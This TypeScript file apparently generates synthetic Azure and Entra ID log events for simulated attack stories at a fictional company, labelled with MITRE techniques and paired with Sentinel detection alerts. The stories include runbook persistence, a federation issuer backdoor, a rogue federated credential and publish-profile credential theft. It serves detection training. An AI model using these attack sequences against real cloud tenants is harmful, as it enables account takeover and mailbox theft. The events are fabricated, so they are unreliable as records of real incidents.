    az({ ...aa, id: "r6azrb07", ts: T(2880), op: "MICROSOFT.AUTOMATION/AUTOMATIONACCOUNTS/JOBS/WRITE", caller: u, ip: caller2, subResource: "jobs/Sync-CertInventory", geo: SIN, asOrg: "hosting provider",
      severity: "high", mitre: "T1053", tactic: "Persistence",
      description: `Azure Activity: a job of Sync-CertInventory started through cert-sync-hook, called from ${caller2} two days later.` }),
    entraAudit({
      companyId: CX, id: "r6azrb08", ts: T(2881), operationName: "Add service principal credentials", category: "ApplicationManagement", loggedByService: "Core Directory", operationType: "Update",
      initiatedByUpn: mi, severity: "high", mitre: "T1098.001", tactic: "Persistence",
      extra: { "azure.auditlogs.target_resources.display_name": "svc-reporting", "azure.auditlogs.target_resources.id": "5d0e8b47-1c92-4f6a-b3e8-90a4c71f2d56", "azure.auditlogs.properties.initiatedBy.app.displayName": mi },
      description: `Entra ID audit: Add service principal credentials, a new client secret on svc-reporting, added by the managed identity of ${mi} during the webhook job. That identity holds Application Administrator for the certificate inventory it was built for.`,
    }),
    sentinel({
      id: "r6azrb09", ts: T(2884), user: u, srcIp: caller2, severity: "high", eventType: "cloud_api_call", mitre: "T1098.001", tactic: "Persistence",
      alertName: "Automation job adds application credentials",
      detail: "A runbook job's managed identity adds a credential to an app registration; the job was started by a webhook called from outside the company.",
      extendedProperties: { AutomationAccount: mi, Runbook: "Sync-CertInventory", Webhook: "cert-sync-hook", CallerIp: caller2, Application: "svc-reporting" },
      description: `Microsoft Sentinel: the webhook of Sync-CertInventory, called from ${caller2}, made ${mi} add a secret to svc-reporting.`,
    }),
  ], "inc:r6az:runbook-webhook");
}

// ══════════════════════════════════════════════════════════════════════════════
// 3b. Automation, team: an hourly runbook keeps re-opening RDP to an outside address
// ══════════════════════════════════════════════════════════════════════════════
function runbookScheduleNsg(): TelemetryEvent[] {
  const T = clock("2026-11-14T07:00:00Z");
  const sp = "e5b20c74-91a3-4d6f-8b1e-0f37c9a2d684";
  const ops = "m.levi@nexacorp.com";
  const sec = "j.chen@nexacorp.com";
  const atk = "198.51.100.239";
  const mi = "aa-backup-jobs";
  const vm = { host: "app-backup-vm03", ip: "10.10.40.43", user: "NT AUTHORITY\SYSTEM" };
  const aa = { provider: "Microsoft.Automation", type: "automationAccounts", name: mi, group: "rg-backup", role: "Automation Contributor" };
  const nsg = { provider: "Microsoft.Network", type: "networkSecurityGroups", name: "nsg-backup-subnet", group: "rg-backup", role: "Network Contributor" };
  const rule = (id: string, min: number) => az({ ...nsg, id, ts: T(min), op: "MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/WRITE", caller: mi, ip: "192.0.2.72",
    subResource: "securityRules/allow-mgmt-3389", severity: "high", mitre: "T1686", tactic: "Defense Impairment",
    description: `Azure Activity: security rule allow-mgmt-3389 written on nsg-backup-subnet by the managed identity of ${mi} at ${T(min).slice(11, 16)}: inbound 3389 from ${atk} allowed.` });
  return withIncident([
    benign(az({ ...aa, id: "r6azsg01", ts: T(-900), op: "MICROSOFT.AUTOMATION/AUTOMATIONACCOUNTS/SCHEDULES/WRITE", caller: ops, ip: OFFICE_EGRESS, subResource: "schedules/stop-dev-vms-1900",
      severity: "low", description: `Azure Activity: schedule stop-dev-vms-1900 written in ${mi} by ${ops} from the office egress.` }),
      "The operations team's evening shutdown of the development VMs: a schedule from the office by the person who owns the account, attached to the published Stop-DevVMs runbook."),
    az({ ...aa, id: "r6azsg02", ts: T(0), op: "MICROSOFT.AUTOMATION/AUTOMATIONACCOUNTS/RUNBOOKS/WRITE", caller: sp, ip: atk, subResource: "runbooks/Check-BackupHealth", geo: FRA, asOrg: "hosting provider",
      severity: "medium", mitre: "T1053", tactic: "Persistence",
      description: `Azure Activity: runbook Check-BackupHealth written in ${mi} by the backup service principal ${sp} from ${atk}.` }),
    az({ ...aa, id: "r6azsg03", ts: T(1), op: "MICROSOFT.AUTOMATION/AUTOMATIONACCOUNTS/SCHEDULES/WRITE", caller: sp, ip: atk, subResource: "schedules/hourly-health", geo: FRA, asOrg: "hosting provider",
      severity: "medium", mitre: "T1053", tactic: "Persistence",
      description: `Azure Activity: schedule hourly-health written in ${mi} by ${sp} from ${atk}.` }),
    az({ ...aa, id: "r6azsg04", ts: T(1.5), op: "MICROSOFT.AUTOMATION/AUTOMATIONACCOUNTS/JOBSCHEDULES/WRITE", caller: sp, ip: atk, subResource: "jobSchedules/hourly-health", geo: FRA, asOrg: "hosting provider",
      severity: "high", mitre: "T1053", tactic: "Persistence",
      description: `Azure Activity: Check-BackupHealth linked to the hourly-health schedule by ${sp} from ${atk}.` }),
    rule("r6azsg05", 60),
    netRow(vm, {
      id: "r6azsg06", ts: T(66), direction: "inbound", remoteIp: atk, remotePort: 3389, application: "tls", processName: "svchost.exe", processPath: "C:\Windows\System32\svchost.exe", pid: 1188,
      bytesOut: 1_904_220, bytesIn: 288_140, severity: "high", mitre: "T1021.001", tactic: "Lateral Movement",
      description: `Inbound RDP to ${vm.host} from ${atk}, six minutes after the rule opened.`,
    }),
    az({ ...nsg, id: "r6azsg07", ts: T(95), op: "MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/DELETE", caller: sec, ip: OFFICE_EGRESS, subResource: "securityRules/allow-mgmt-3389",
      severity: "informational", description: `Azure Activity: security rule allow-mgmt-3389 deleted from nsg-backup-subnet by ${sec} from the office egress.` }),
    rule("r6azsg08", 120),
    netRow(vm, {
      id: "r6azsg09", ts: T(123), direction: "inbound", remoteIp: atk, remotePort: 3389, application: "tls", processName: "svchost.exe", processPath: "C:\Windows\System32\svchost.exe", pid: 1188,
      bytesOut: 2_412_880, bytesIn: 301_204, severity: "high", mitre: "T1021.001", tactic: "Lateral Movement",
      description: `Inbound RDP to ${vm.host} from ${atk} again, three minutes after the rule came back.`,
    }),
    sentinel({
      id: "r6azsg10", ts: T(126), srcIp: atk, entity: mi, host: vm.host, severity: "high", eventType: "cloud_api_call", mitre: "T1053", tactic: "Persistence",
      alertName: "Deleted network rule re-created by an automation identity",
      detail: "An Automation account's managed identity writes the same network security rule again within an hour of its deletion, on the hour.",
      extendedProperties: { AutomationAccount: mi, Runbook: "Check-BackupHealth", Rule: "allow-mgmt-3389", AllowedSource: atk },
      description: `Microsoft Sentinel: ${mi} re-created allow-mgmt-3389 after it was deleted, and RDP from ${atk} followed.`,
    }),
  ], "inc:r6az:runbook-nsg");
}

// ══════════════════════════════════════════════════════════════════════════════
// 4a. Federation, solo: a domain trusts an outside issuer; MFA arrives as a claim
// ══════════════════════════════════════════════════════════════════════════════
function federatedDomain(): TelemetryEvent[] {
  const T = clock("2026-11-15T23:10:00Z");
  const ga = "l.ferreira@nexacorp.com";
  const victim = "r.avraham@nexacorp.com";
  const atk = "203.0.113.138";
  const atk2 = "192.0.2.93";
  const domain = "partners.nexacorp.com";
  const evil = "https://sts.secure-federation.example/adfs/services/trust";
  const fed = (id: string, min: number, by: string, ip: string, issuer: string, sev: Severity, mitre?: string, tactic?: string) => entraAudit({
    companyId: CX, id, ts: T(min), operationName: "Set federation settings on domain", category: "DirectoryManagement", loggedByService: "Core Directory", operationType: "Update",
    initiatedByUpn: by, initiatedByIp: ip, severity: sev, mitre, tactic,
    extra: { "azure.auditlogs.properties.targetResources[0].displayName": domain, "azure.auditlogs.properties.targetResources[0].type": "Domain",
      "azure.auditlogs.properties.targetResources[0].modifiedProperties[0].displayName": "IssuerUri", "azure.auditlogs.properties.targetResources[0].modifiedProperties[0].newValue": `"${issuer}"` },
    description: `Entra ID audit: Set federation settings on domain ${domain} by ${by} from ${ip}, IssuerUri ${issuer}.`,
  });
  return withIncident([
    ticket({ id: "r6azfd00", ts: T(-4000), table: "change_request", number: "CHG0063290", state: "Implement", caller: ga, severity: "informational",
      shortDescription: `Token-signing certificate rollover for ${domain} (AD FS)`, eventType: "policy_modification",
      description: `ServiceNow change CHG0063290 (Implement): AD FS token-signing certificate rollover for ${domain}.`,
      extra: changeFields({ requestedBy: "l.ferreira@nexacorp.com", group: "Identity Team", ci: "AD FS farm", from: "2026-11-13T00:00:00Z", hours: 8, detail: "Roll over the AD FS token-signing certificate and update the federation settings of the partners domain." }) }),
    benign(fed("r6azfd01", -3960, ga, OFFICE_EGRESS, "http://sts.nexacorp.com/adfs/services/trust", "medium"),
      "The certificate rollover under CHG0063290: the company's own AD FS issuer, from the office, inside the change window."),
    entraSignIn({
      companyId: CX, id: "r6azfd02", ts: T(0), user: ga, srcIp: atk, app: "Microsoft Graph PowerShell", resource: "Microsoft Graph", isInteractive: true, mfa: true,
      userAgent: UA_AZPS, riskLevel: "medium", riskEventTypes: ["unfamiliarFeatures"], severity: "medium", mitre: "T1078.004", tactic: "Initial Access",
      description: `Entra ID sign-in for ${ga} to Microsoft Graph PowerShell from ${atk} at 23:10, MFA satisfied, risk medium.`,
    }),
    fed("r6azfd03", 4, ga, atk, evil, "critical", "T1484", "Stealth"),
    entraAudit({
      companyId: CX, id: "r6azfd04", ts: T(4.2), operationName: "Set domain authentication", category: "DirectoryManagement", loggedByService: "Core Directory", operationType: "Update",
      initiatedByUpn: ga, initiatedByIp: atk, severity: "critical", mitre: "T1484.002", tactic: "Stealth",
      extra: { "azure.auditlogs.properties.targetResources[0].displayName": domain, "azure.auditlogs.properties.targetResources[0].modifiedProperties[0].displayName": "LiveType",
        "azure.auditlogs.properties.targetResources[0].modifiedProperties[0].oldValue": "\"Federated\"", "azure.auditlogs.properties.targetResources[0].modifiedProperties[0].newValue": "\"Federated\"" },
      description: `Entra ID audit: Set domain authentication on ${domain} by ${ga} from ${atk}, the domain stays federated with the new issuer.`,
    }),
    entraAudit({
      companyId: CX, id: "r6azfd05", ts: T(9), operationName: "Update user", category: "UserManagement", loggedByService: "Core Directory",
      initiatedByUpn: ga, initiatedByIp: atk, targetUpn: victim, severity: "high", mitre: "T1098", tactic: "Persistence",
      extra: { "azure.auditlogs.properties.targetResources[0].modifiedProperties[0].displayName": "UserPrincipalName", "azure.auditlogs.properties.targetResources[0].modifiedProperties[0].newValue": `"r.avraham@${domain}"` },
      description: `Entra ID audit: Update user ${victim} by ${ga} from ${atk}, sign-in name moved to the ${domain} suffix.`,
    }),
    entraSignIn({
      companyId: CX, id: "r6azfd06", ts: T(21), user: victim, srcIp: atk2, app: "Office 365 Exchange Online", isInteractive: true, mfa: true, userAgent: UA_PY,
      tokenIssuerType: "ADFSFederated", tokenIssuerName: evil, authenticationProtocol: "saml20", authStepResultDetail: "MFA requirement satisfied by claim in the token",
      severity: "critical", mitre: "T1606.002", tactic: "Credential Access",
      description: `Entra ID sign-in for ${victim} to Exchange Online from ${atk2}, token issuer ${evil}, MFA satisfied by a claim in the token. ${victim} signed in from the office two hours earlier.`,
    }),
    m365Operation({
      companyId: CX, id: "r6azfd07", ts: T(24), user: victim, operation: "MailItemsAccessed", workload: "Exchange", srcIp: atk2, userAgent: UA_PY,
      extra: { MailAccessType: "Bind", OperationCount: "214" }, severity: "high", mitre: "T1114.002", tactic: "Collection",
      description: `Exchange audit: MailItemsAccessed, 214 items of ${victim}'s mailbox bound from ${atk2}.`,
    }),
    sentinel({
      id: "r6azfd08", ts: T(26), user: victim, srcIp: atk2, severity: "critical", eventType: "cloud_api_call", mitre: "T1484.002", tactic: "Stealth",
      alertName: "Federation issuer changed, then federated sign-ins from the new issuer",
      detail: "Set federation settings on domain with an IssuerUri never seen before, followed within an hour by ADFSFederated sign-ins naming that issuer.",
      extendedProperties: { Domain: domain, IssuerUri: evil, ChangedBy: ga, ChangedFrom: atk, FirstSignIn: victim },
      description: `Microsoft Sentinel: ${domain} now trusts ${evil}, and ${victim} signed in with a token from it.`,
    }),
  ], "inc:r6az:fed-domain");
}

// ══════════════════════════════════════════════════════════════════════════════
// 4b. Federation, team: a federated credential on an app trusts an outside repository
// ══════════════════════════════════════════════════════════════════════════════
function federatedCredentialApp(): TelemetryEvent[] {
  const T = clock("2026-11-16T12:20:00Z");
  const dev = "d.cohen@nexacorp.com";
  const sec = "s.patel@nexacorp.com";
  const atk = "192.0.2.94";
  const runner = "192.0.2.95";
  const app = "hr-docs-sync";
  const fic = (id: string, min: number, by: string, ip: string, subject: string, sev: Severity, mitre?: string, tactic?: string) => entraAudit({
    companyId: CX, id, ts: T(min), operationName: "Update application", category: "ApplicationManagement", loggedByService: "Core Directory",
    initiatedByUpn: by, initiatedByIp: ip, severity: sev, mitre, tactic,
    extra: { "azure.auditlogs.properties.targetResources[0].displayName": app, "azure.auditlogs.properties.targetResources[0].type": "Application",
      "azure.auditlogs.properties.targetResources[0].modifiedProperties[0].displayName": "FederatedIdentityCredentials",
      "azure.auditlogs.properties.targetResources[0].modifiedProperties[0].newValue": `[{"issuer":"https://token.actions.githubusercontent.com","subject":"${subject}"}]` },
    description: `Entra ID audit: Update application ${app} by ${by} from ${ip}: a federated identity credential for GitHub Actions, subject ${subject}.`,
  });
  return withIncident([
    benign(fic("r6azfa01", -2880, sec, OFFICE_EGRESS, "repo:nexacorp-eng/hr-docs-sync:ref:refs/heads/main", "medium", "T1098.001", "Persistence"),
      "The HR documents sync pipeline was moved to workload identity federation: the subject is the company's own repository and branch, set from the office by the app's owner."),
    entraSignIn({
      companyId: CX, id: "r6azfa02", ts: T(0), user: dev, srcIp: atk, app: "Microsoft Azure CLI", appId: AZ_CLI_APP, resource: "Microsoft Graph", isInteractive: false, mfa: true,
      userAgent: UA_AZCLI, riskLevel: "high", riskEventTypes: ["anomalousToken"], severity: "high", mitre: "T1550.001", tactic: "Lateral Movement",
      description: `Entra ID non-interactive sign-in for ${dev} (a co-owner of ${app}) to Microsoft Azure CLI from ${atk}, risk high (anomalousToken).`,
    }),
    fic("r6azfa03", 5, dev, atk, "repo:docs-mirror-tools/sync-agent:environment:prod", "critical", "T1098.001", "Persistence"),
    entraSignIn({
      companyId: CX, id: "r6azfa04", ts: T(22), user: dev, srcIp: runner, app, resource: "Microsoft Graph", isInteractive: false, mfa: false, userAgent: "azure-identity-python/1.19.0",
      severity: "high", mitre: "T1078.004", tactic: "Initial Access",
      extra: { "azure.signinlogs.properties.servicePrincipalName": app, "azure.signinlogs.properties.clientCredentialType": "federatedIdentityCredential" },
      description: `Entra ID sign-in through ${app} from ${runner} with a federated identity credential: a GitHub-hosted runner of the outside repository.`,
    }),
    m365Operation({
      companyId: CX, id: "r6azfa05", ts: T(24), user: dev, operation: "MailItemsAccessed", workload: "Exchange", srcIp: runner, userAgent: "azure-identity-python/1.19.0",
      extra: { MailAccessType: "Sync", AppId: app, OperationCount: "1206" }, severity: "critical", mitre: "T1114.002", tactic: "Collection",
      description: `Exchange audit: MailItemsAccessed (Sync), 1,206 items of the HR manager's mailbox read by the app ${app} from ${runner}.`,
    }),
    m365Operation({
      companyId: CX, id: "r6azfa06", ts: T(26), user: "j.chen@nexacorp.com", operation: "MailItemsAccessed", workload: "Exchange", srcIp: runner, userAgent: "azure-identity-python/1.19.0",
      extra: { MailAccessType: "Sync", AppId: app, OperationCount: "642" }, severity: "critical", mitre: "T1114.002", tactic: "Collection",
      description: `Exchange audit: MailItemsAccessed (Sync), 642 items of the accountant's mailbox read by the app ${app} from ${runner}.`,
    }),
    m365Operation({
      companyId: CX, id: "r6azfa06b", ts: T(27.5), user: "a.kaplan@nexacorp.com", operation: "MailItemsAccessed", workload: "Exchange", srcIp: runner, userAgent: "azure-identity-python/1.19.0",
      extra: { MailAccessType: "Sync", AppId: app, OperationCount: "388" }, severity: "critical", mitre: "T1114.002", tactic: "Collection",
      description: `Exchange audit: MailItemsAccessed (Sync), 388 items of a sales mailbox read by the app ${app} from ${runner}.`,
    }),
    sentinel({
      id: "r6azfa07", ts: T(30), user: dev, srcIp: atk, severity: "critical", eventType: "cloud_api_call", mitre: "T1098.001", tactic: "Persistence",
      alertName: "Federated identity credential added with an outside subject",
      detail: "A FederatedIdentityCredentials change whose subject names a repository outside the company's GitHub organization, followed by the app's sign-ins.",
      extendedProperties: { Application: app, Subject: "repo:docs-mirror-tools/sync-agent:environment:prod", ChangedBy: dev, ChangedFrom: atk },
      description: `Microsoft Sentinel: ${app} now trusts tokens from an outside repository, and it is reading mailboxes.`,
    }),
    entraAudit({
      companyId: CX, id: "r6azfa08", ts: T(48), operationName: "Update application", category: "ApplicationManagement", loggedByService: "Core Directory",
      initiatedByUpn: sec, initiatedByIp: OFFICE_EGRESS, severity: "informational",
      extra: { "azure.auditlogs.properties.targetResources[0].displayName": app, "azure.auditlogs.properties.targetResources[0].modifiedProperties[0].displayName": "FederatedIdentityCredentials" },
      description: `Entra ID audit: Update application ${app} by its owner from the office, the outside federated credential removed.`,
    }),
  ], "inc:r6az:fed-app");
}

// ══════════════════════════════════════════════════════════════════════════════
// 5a. Function App, solo: a publish profile from outside, then the app's identity lists storage keys
// ══════════════════════════════════════════════════════════════════════════════
function functionPublishXml(): TelemetryEvent[] {
  const T = clock("2026-11-17T16:00:00Z");
  const u = "s.patel@nexacorp.com";
  const dev = "t.harris@nexacorp.com";
  const atk = "192.0.2.96";
  const miIp = "192.0.2.97";
  const mi = "fn-campaign-forms";
  const site = { provider: "Microsoft.Web", type: "sites", name: "fn-campaign-forms", group: "rg-marketing-web", role: "Website Contributor" };
  const st = { provider: "Microsoft.Storage", type: "storageAccounts", name: "stcampaignleads", group: "rg-marketing-data", role: "Storage Account Contributor" };
  return withIncident([
    benign(az({ ...site, id: "r6azfp01", ts: T(-1440), op: "MICROSOFT.WEB/SITES/PUBLISHXML/ACTION", caller: dev, ip: OFFICE_EGRESS, severity: "medium", mitre: "T1552.001", tactic: "Credential Access",
      description: `Azure Activity: publishxml on ${site.name} by ${dev} from the office egress.` }),
      "The DevOps lead downloads the publish profile when setting up a new deployment slot: the office, during the working day, a person who deploys this app."),
    entraSignIn({
      companyId: CX, id: "r6azfp02", ts: T(0), user: u, srcIp: atk, app: "Azure Portal", resource: "Windows Azure Service Management API", isInteractive: true, mfa: true,
      userAgent: UA_EDGE, os: "Windows 10", browser: "Edge 141.0.0", riskLevel: "medium", riskEventTypes: ["unfamiliarFeatures"], severity: "medium", mitre: "T1078.004", tactic: "Initial Access",
      description: `Entra ID sign-in for ${u} to the Azure Portal from ${atk}, MFA satisfied, risk medium.`,
    }),
    az({ ...site, id: "r6azfp03", ts: T(3), op: "MICROSOFT.WEB/SITES/PUBLISHXML/ACTION", caller: u, ip: atk, geo: AMS, asOrg: "hosting provider", severity: "high", mitre: "T1552.001", tactic: "Credential Access",
      description: `Azure Activity: publishxml on ${site.name} by ${u} from ${atk}: the publish profile carries the app's deployment user name and password.` }),
    az({ ...site, id: "r6azfp04", ts: T(11), op: "MICROSOFT.WEB/SITES/CONFIG/WRITE", caller: u, ip: atk, subResource: "config/appsettings", geo: AMS, asOrg: "hosting provider",
      severity: "high", mitre: "T1505", tactic: "Persistence",
      description: `Azure Activity: application settings of ${site.name} written by ${u} from ${atk} (a new setting WEBSITE_RUN_FROM_PACKAGE pointing outside the company's storage).` }),
    az({ ...site, id: "r6azfp05", ts: T(12), op: "MICROSOFT.WEB/SITES/RESTART/ACTION", caller: u, ip: atk, geo: AMS, asOrg: "hosting provider", severity: "medium", mitre: "T1505", tactic: "Persistence",
      description: `Azure Activity: ${site.name} restarted by ${u} from ${atk}, loading the new package.` }),
    az({ ...st, id: "r6azfp06", ts: T(19), op: "MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION", caller: mi, ip: miIp, geo: SIN, asOrg: "hosting provider",
      severity: "critical", mitre: "T1550.001", tactic: "Lateral Movement",
      description: `Azure Activity: listKeys on stcampaignleads by the managed identity of ${mi} from ${miIp}, an address outside Azure. The identity's calls always come from the app's own Azure outbound addresses.` }),
    az({ ...st, id: "r6azfp07", ts: T(19.6), op: "MICROSOFT.STORAGE/STORAGEACCOUNTS/REGENERATEKEY/ACTION", caller: mi, ip: miIp, geo: SIN, asOrg: "hosting provider",
      severity: "critical", mitre: "T1485", tactic: "Impact",
      description: `Azure Activity: regenerateKey on stcampaignleads by the managed identity of ${mi} from ${miIp}, breaking every client that used key1.` }),
    sentinel({
      id: "r6azfp08", ts: T(22), user: u, srcIp: miIp, severity: "critical", eventType: "cloud_api_call", mitre: "T1550.001", tactic: "Lateral Movement",
      alertName: "Managed identity used from outside Azure",
      detail: "Azure Resource Manager calls by a managed identity from an address outside Azure's ranges, after its app's publish profile was downloaded from a hosting provider.",
      extendedProperties: { ManagedIdentity: mi, CallerIp: miIp, PublishProfileBy: u, PublishProfileFrom: atk },
      description: `Microsoft Sentinel: the identity of ${mi} called Resource Manager from ${miIp} after ${u} downloaded its publish profile from ${atk}.`,
    }),
    az({ ...site, id: "r6azfp09", ts: T(40), op: "MICROSOFT.WEB/SITES/STOP/ACTION", caller: dev, ip: OFFICE_EGRESS, severity: "informational",
      description: `Azure Activity: ${site.name} stopped by ${dev} from the office egress.` }),
  ], "inc:r6az:fn-publishxml");
}

// ══════════════════════════════════════════════════════════════════════════════
// 5b. Function App, team: basic publishing credentials re-enabled; the app's identity grants a role
// ══════════════════════════════════════════════════════════════════════════════
function functionBasicAuth(): TelemetryEvent[] {
  const T = clock("2026-11-18T03:40:00Z");
  const sp = "4f9c1a63-27e8-4b0d-a5c4-9d61e0b38f72";
  const owner = "r.avraham@nexacorp.com";
  const atk = "192.0.2.98";
  const miIp = "192.0.2.99";
  const mi = "fn-invoice-ingest";
  const outsider = "a8e3d5f1-62b0-47c9-9e14-3c75b2d0f619";
  const site = { provider: "Microsoft.Web", type: "sites", name: "fn-invoice-ingest", group: "rg-finance-apps", role: "Contributor" };
  return withIncident([
    benign(az({ ...site, id: "r6azfb01", ts: T(-2000), op: "MICROSOFT.WEB/SITES/CONFIG/LIST/ACTION", caller: owner, ip: OFFICE_EGRESS, subResource: "config/appsettings",
      severity: "low", description: `Azure Activity: application settings of ${site.name} listed by ${owner} from the office egress.` }),
      "The invoice app's business owner reviews its settings from the portal: the office, a person named on the app, a read of the settings page."),
    az({ ...site, id: "r6azfb02", ts: T(0), op: "MICROSOFT.WEB/SITES/BASICPUBLISHINGCREDENTIALSPOLICIES/WRITE", caller: sp, ip: atk, subResource: "basicPublishingCredentialsPolicies/scm",
      geo: FRA, asOrg: "hosting provider", severity: "high", mitre: "T1685", tactic: "Defense Impairment",
      description: `Azure Activity: basic authentication for the SCM (deployment) site of ${site.name} switched back on by the finance deployment principal ${sp} from ${atk}. Company policy keeps it off.` }),
    az({ ...site, id: "r6azfb03", ts: T(1), op: "MICROSOFT.WEB/SITES/CONFIG/LIST/ACTION", caller: sp, ip: atk, subResource: "config/publishingcredentials", geo: FRA, asOrg: "hosting provider",
      severity: "high", mitre: "T1552.001", tactic: "Credential Access",
      description: `Azure Activity: publishingcredentials of ${site.name} listed by ${sp} from ${atk}: the deployment user name and password.` }),
    az({ ...site, id: "r6azfb04", ts: T(4), op: "MICROSOFT.WEB/SITES/HOST/FUNCTIONKEYS/WRITE", caller: sp, ip: atk, subResource: "host/default/functionKeys/ops-probe",
      geo: FRA, asOrg: "hosting provider", severity: "high", mitre: "T1098.001", tactic: "Persistence",
      description: `Azure Activity: a new host function key ops-probe on ${site.name} by ${sp} from ${atk}.` }),
    az({ ...site, id: "r6azfb04b", ts: T(8.6), op: "MICROSOFT.WEB/SITES/SYNCFUNCTIONTRIGGERS/ACTION", caller: sp, ip: atk, geo: FRA, asOrg: "hosting provider",
      severity: "medium", mitre: "T1105", tactic: "Command and Control",
      description: `Azure Activity: syncfunctiontriggers on ${site.name} by ${sp} from ${atk}, the call a deployment tool makes after pushing new function code.` }),
    az({ ...site, id: "r6azfb05", ts: T(9), op: "MICROSOFT.WEB/SITES/RESTART/ACTION", caller: sp, ip: atk, geo: FRA, asOrg: "hosting provider", severity: "medium", mitre: "T1505", tactic: "Persistence",
      description: `Azure Activity: ${site.name} restarted by ${sp} from ${atk}, four minutes after code was pushed through the deployment site.` }),
    az({ provider: "Microsoft.Authorization", type: "roleAssignments", name: "b17e40c2-5d93-4a8f-9e61-c0d2a47f9b35", group: "rg-finance-apps", role: "User Access Administrator",
      id: "r6azfb06", ts: T(15), op: "MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE", caller: mi, ip: miIp, geo: ASH, asOrg: "hosting provider",
      severity: "critical", mitre: "T1098.003", tactic: "Persistence",
      description: `Azure Activity: role assignment write by the managed identity of ${mi} from ${miIp}: Contributor on rg-finance-apps for the principal ${outsider}, which belongs to no company app.` }),
    entraSignIn({
      companyId: CX, id: "r6azfb07", ts: T(21), user: owner, srcIp: atk, app: "Microsoft Azure CLI", appId: AZ_CLI_APP, resource: "Windows Azure Service Management API", isInteractive: false,
      mfa: false, userAgent: UA_AZCLI, result: "failure", errorCode: "53003", severity: "medium", mitre: "T1078.004", tactic: "Initial Access",
      description: `Entra ID sign-in for ${owner} to Microsoft Azure CLI from ${atk} blocked by Conditional Access (53003).`,
    }),
    sentinel({
      id: "r6azfb08", ts: T(23), srcIp: atk, entity: mi, severity: "critical", eventType: "cloud_api_call", mitre: "T1098.003", tactic: "Persistence",
      alertName: "Function App identity creates a role assignment from outside Azure",
      detail: "A managed identity writes a role assignment from an address outside Azure, within an hour of its app's basic publishing credentials being re-enabled and listed.",
      extendedProperties: { ManagedIdentity: mi, Assignee: outsider, Scope: "rg-finance-apps", CredentialsPolicyChangedBy: sp },
      description: `Microsoft Sentinel: the identity of ${mi} gave Contributor to an unknown principal after ${sp} re-enabled basic publishing credentials from ${atk}.`,
    }),
  ], "inc:r6az:fn-basic");
}

const AZ = ["nexacorp", "medcore"];
export const CLOUD_R6_AZURE_STORIES: AiStoryDef[] = [
  { id: "cloud-az-devicecode-sharepoint", title: "Device Code Sign-In from the Office, Then the Same Session Downloads Sales Documents from a Script",
    complexity: "core", family: "cloud-azure-device-code", mode: "solo", companies: AZ, officeEgress: OFFICE_EGRESS, events: deviceCodeSharePoint() },
  { id: "cloud-az-devicecode-azcli", title: "Azure CLI Device Code Sign-In, Then Storage Keys Listed and a Disk Snapshot Opened for Download",
    complexity: "advanced", family: "cloud-azure-device-code", mode: "team", companies: AZ, officeEgress: OFFICE_EGRESS, events: deviceCodeAzCli() },
  { id: "cloud-az-runcommand-sp-localadmin", title: "Deployment Service Principal Runs a Command on a Payroll VM from a Hosting Address",
    complexity: "core", family: "cloud-azure-vm-run-command", mode: "solo", companies: AZ, officeEgress: OFFICE_EGRESS, ownServers: true, events: runCommandLocalAdmin() },
  { id: "cloud-az-runcommand-managed-lsass", title: "Managed Run Command Written from a Risky Sign-In, Then a Memory Dump Leaves an ERP VM",
    complexity: "advanced", family: "cloud-azure-vm-run-command", mode: "team", companies: AZ, ownServers: true, events: runCommandManagedDump() },
  { id: "cloud-az-runbook-webhook-secret", title: "New Runbook and Webhook from a Hosting Address, Then an App Gains a Secret Two Days Later",
    complexity: "core", family: "cloud-azure-automation-persistence", mode: "solo", companies: AZ, officeEgress: OFFICE_EGRESS, events: runbookWebhookSecret() },
  { id: "cloud-az-runbook-schedule-nsg", title: "Hourly Runbook Re-Creates a Deleted Network Rule, Then RDP Arrives from Outside",
    complexity: "advanced", family: "cloud-azure-automation-persistence", mode: "team", companies: AZ, officeEgress: OFFICE_EGRESS, ownServers: true, events: runbookScheduleNsg() },
  { id: "cloud-az-federated-domain", title: "Late-Night Change to a Domain's Federation Issuer, Then a Sign-In with MFA from a Token Claim",
    complexity: "advanced", family: "cloud-azure-federation-backdoor", mode: "solo", companies: AZ, officeEgress: OFFICE_EGRESS, events: federatedDomain() },
  { id: "cloud-az-federated-credential-app", title: "App Gets a Federated Credential for a Repository Outside the Company, Then Reads Mailboxes",
    complexity: "advanced", family: "cloud-azure-federation-backdoor", mode: "team", companies: AZ, officeEgress: OFFICE_EGRESS, events: federatedCredentialApp() },
  { id: "cloud-az-function-publishxml", title: "Function App Publish Profile Downloaded from a Hosting Address, Then Its Identity Lists Storage Keys from Outside Azure",
    complexity: "core", family: "cloud-azure-function-publish-profile", mode: "solo", companies: AZ, officeEgress: OFFICE_EGRESS, events: functionPublishXml() },
  { id: "cloud-az-function-basic-auth", title: "Basic Publishing Credentials Re-Enabled on a Function App, Then Its Identity Writes a Role Assignment",
    complexity: "advanced", family: "cloud-azure-function-publish-profile", mode: "team", companies: AZ, officeEgress: OFFICE_EGRESS, events: functionBasicAuth() },
];
